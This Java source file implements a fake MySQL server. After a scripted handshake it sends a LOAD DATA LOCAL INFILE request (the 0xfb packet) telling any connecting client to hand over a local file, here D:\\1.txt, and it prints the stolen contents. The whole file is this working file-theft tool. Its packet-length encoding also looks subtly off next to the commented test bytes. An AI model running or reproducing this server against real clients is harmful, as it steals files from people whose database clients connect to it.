package org.sec.Network;

import org.apache.log4j.Logger;
import org.sec.Constant.configuration;
import org.sec.utils.stringUtils;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;

public class Socket extends Thread {
    private ServerSocket serverSocket;
    private static final Logger logger = Logger.getLogger(Socket.class);

    public static void main(String[] args) {
        connect(configuration.PORT);
    }

    public static void connect(int port) {
        try {
            Thread t = new Socket(port);
            t.run();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception ignored) {
        }
    }

    public Socket(int port) throws IOException {
        serverSocket = new ServerSocket(port);
    }

    public void run() {
        while (true) {
            java.net.Socket server;
            try {
                server = serverSocket.accept();
                logger.info("[+] 已连接的客户端: " + server.getRemoteSocketAddress());
                DataInputStream in = new DataInputStream(server.getInputStream());
                DataOutputStream out = new DataOutputStream(server.getOutputStream());

                out.write(configuration.versionText);
                out.flush();
                in.read();
                out.write(configuration.verificationText);
                out.flush();
                byte[] bys = new byte[9999];
                in.read(bys);

                String filename = "D:\\1.txt";
                getData(filename, server);
                server.close();
                break;
            } catch (IOException e) {
                e.printStackTrace();
                throw new RuntimeException(e);
            }
        }
    }

    public static void getData(String filename, java.net.Socket server) throws IOException {
        //String basePath = "";
        byte[] byte1 = String.valueOf(filename.length()).getBytes(StandardCharsets.UTF_8);
        byte[] byte2 = {0x00, 0x00, 0x01, (byte) 0xfb};
        byte[] byte3 = filename.getBytes(StandardCharsets.UTF_8);

        byte[] lastByte = stringUtils.byteMerger(byte1, byte2);
        lastByte = stringUtils.byteMerger(lastByte, byte3);

        DataInputStream in = new DataInputStream(server.getInputStream());
        DataOutputStream out = new DataOutputStream(server.getOutputStream());
        //byte[] test = {0x09,0x00,0x00,0x01, (byte) 0xfb,0x43,0x3a,0x2f,0x31,0x2e,0x74,0x78,0x74};
        out.write(lastByte);
        out.flush();
        byte[] bys = new byte[9999];
        in.read(bys);
        System.out.println(new String(bys,0,in.read(bys)));

    }
}
